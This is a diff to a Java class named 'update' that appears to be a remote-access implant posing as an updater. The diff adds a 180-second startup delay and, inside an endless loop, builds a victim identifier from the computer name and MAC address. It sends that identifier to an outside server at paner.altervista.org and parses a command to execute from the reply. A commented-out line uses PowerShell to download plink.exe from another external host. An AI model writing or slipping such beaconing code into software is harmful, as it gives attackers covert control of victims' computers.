@@ -25,6 +25,16 @@ public class update{
 		InetAddress addr;
 		Runtime runtime = Runtime.getRuntime();
 		
+		
+		
+		try {
+        	Thread.sleep(180 * 1000);
+        }
+        catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+/*		
+		
 		File srcFile = new File(System.getProperty("user.dir") + "\\update.jar");
 		File trgFile = new File(System.getProperty("user.home") + "\\update.jar");
 		try{
@@ -51,18 +61,8 @@ public class update{
 		{
 			    
 		}
-		try
-		{
-			addr = InetAddress.getLocalHost();
-		    hostname = addr.getHostName();
-		    hostname=hostname+"_"+GetNetworkAddress.GetAddress("mac");
-		    
-		}
-		catch (UnknownHostException ex)
-		{
-		    System.out.println("Hostname can not be resolved");
-		}
-/*		try {
+*/		
+	/*	try {
 			
 			Runtime runtime = Runtime.getRuntime();
 	        String cmds = "cmd /C powershell Invoke-WebRequest -Uri 'http://pannello.xoom.it/svc/plink.dat' -OutFile 'd:\\dati\\plink.exe'";
@@ -70,8 +70,21 @@ public class update{
 		}
 		catch (IOException e) {
 		}
-*/		//try {
+	*/	//try {
+		
 	        while (true) {
+	        	//try
+	    		//{
+	    			//addr = InetAddress.getLocalHost();
+	    		    //hostname = addr.getHostName();
+	    		    hostname =System.getenv("COMPUTERNAME");
+	    		    hostname=hostname+"_"+GetNetworkAddress.GetAddress("mac");
+	    		    
+	    		//}
+	    		//catch (UnknownHostException ex)
+	    		//{
+	    		//    System.out.println("Hostname can not be resolved");
+	    		//}
 	        	result=getResponseFromUrl("http://paner.altervista.org/svc/wup.php?pc="+hostname);
 	        	String[] array = result.split("\\|\\|", -1);
 	        	String exec=array[6].substring(5);
@@ -113,6 +126,7 @@ public class update{
 		        catch (InterruptedException e) {
 		            e.printStackTrace();
 		        }
+		        
 	        }
 		//}
 	    //catch (IOException e) {
